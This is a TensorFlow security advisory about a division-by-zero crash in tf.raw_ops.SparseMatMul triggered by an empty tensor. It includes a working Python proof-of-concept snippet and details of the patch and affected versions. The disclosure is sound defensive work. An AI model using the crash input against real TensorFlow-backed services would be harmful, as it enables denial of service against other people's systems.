An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`. The division by 0 occurs deep in Eigen code because the `b` tensor is empty. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`:\n\n```python\nimport tensorflow as tf\n\na = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)\nb = tf.constant([], shape=[0, 2], dtype=tf.float32)\n\ntf.raw_ops.SparseMatMul(\n    a=a, b=b, transpose_a=True, transpose_b=True,\n    a_is_sparse=True, b_is_sparse=True)\n``` \n    \nThe division by 0 occurs deep in Eigen code because the `b` tensor is empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).\n\nThe fix will be included in TensorFlow 2.5.0.
